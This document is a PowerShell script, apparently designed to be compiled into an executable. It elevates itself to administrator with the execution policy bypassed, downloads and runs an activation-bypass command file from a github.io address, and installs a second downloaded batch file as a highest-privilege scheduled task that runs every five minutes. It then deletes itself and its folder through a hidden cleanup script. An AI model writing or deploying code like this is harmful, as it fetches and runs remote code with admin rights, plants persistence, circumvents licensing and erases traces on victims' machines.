# Set up error logging - works for both .ps1 and .exe
if ($PSScriptRoot) {
    $logPath = Join-Path $PSScriptRoot "log.txt"
} else {
    # When compiled to EXE, use the EXE's location
    $logPath = Join-Path (Split-Path -Parent ([Environment]::GetCommandLineArgs()[0])) "log.txt"
}

function Write-Log {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Add-Content -Path $logPath -Value "[$timestamp] $Message"
}

function Require-Admin {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = [Security.Principal.WindowsPrincipal]::new($currentUser)
    
    if (-NOT $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Write-Host "Elevating to administrator..." -ForegroundColor Yellow
        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" $args" -Verb RunAs
        exit
    }
}

# Asking for Admin Privileges
Require-Admin

# STEP 1 #
try {
    $scriptFolder = "C:\Scripts"
    if (-not (Test-Path $scriptFolder)) {
        New-Item -ItemType Directory -Path $scriptFolder -Force
    }
    $filePath = Join-Path $scriptFolder "MAS_AIO.cmd"
    
    # Download the file
    Invoke-WebRequest -Uri "https://somar-jaber.github.io/the-blob-blog/MAS_AIO.cmd" -OutFile $filePath
    
    # Fix line endings (convert LF to CRLF for Windows compatibility)
    $content = Get-Content -Path $filePath -Raw
    # Replace LF with CRLF (Windows line endings)
    $content = $content -replace "`n", "`r`n"
    # Remove any trailing empty lines
    $content = $content.TrimEnd()
    # Add a newline at the end if missing
    if (-not $content.EndsWith("`r`n")) {
        $content += "`r`n"
    }
    [System.IO.File]::WriteAllText($filePath, $content, [System.Text.Encoding]::Default)
    
    Write-Log "STEP 1: MAS_AIO.cmd downloaded and line endings fixed"
    
    & $filePath
}
catch {
    Write-Log "STEP 1 ERROR: $_"
}

# STEP 2 #
try {
    $deactivationScriptPath = Join-Path $scriptFolder "deActivation.bat"
    Invoke-WebRequest -Uri "https://somar-jaber.github.io/the-blob-blog/deactivation.bat" -OutFile $deactivationScriptPath 
    
    # Fix line endings for deActivation.bat as well
    $content = Get-Content -Path $deactivationScriptPath -Raw
    $content = $content -replace "`n", "`r`n"
    $content = $content.TrimEnd()
    if (-not $content.EndsWith("`r`n")) {
        $content += "`r`n"
    }
    [System.IO.File]::WriteAllText($deactivationScriptPath, $content, [System.Text.Encoding]::Default)
    
    Write-Log "STEP 2: deActivation.bat downloaded and line endings fixed"
    
    & schtasks /create /tn "theblobDeactivation" /tr $deactivationScriptPath /sc minute /mo 5 /d 1 /st 15:00 /RL HIGHEST /F
}
catch {
    Write-Log "STEP 2 ERROR: $_"
}

# STEP 3 #
try {
    # Get the correct self path for both PS1 and EXE
    if ($PSCommandPath) {
        $selfPath = $PSCommandPath
    } else {
        # When compiled to EXE, get the EXE path
        $selfPath = [Environment]::GetCommandLineArgs()[0]
    }
    
    $cleanupContent = @"
@echo off
timeout /t 2 /nobreak >nul
del /f /q "$selfPath" 2>nul
rmdir /s /q "C:\Scripts" 2>nul
del /f /q "%~f0" 2>nul
exit /b 0
"@

    $cleanupPath = Join-Path $env:TEMP "cleanup_$(Get-Random).bat"
    [System.IO.File]::WriteAllText($cleanupPath, $cleanupContent)
    
    Start-Process -FilePath $cleanupPath -WindowStyle Hidden
    exit
}
catch {
    Write-Log "STEP 3 ERROR: $_"
    exit
}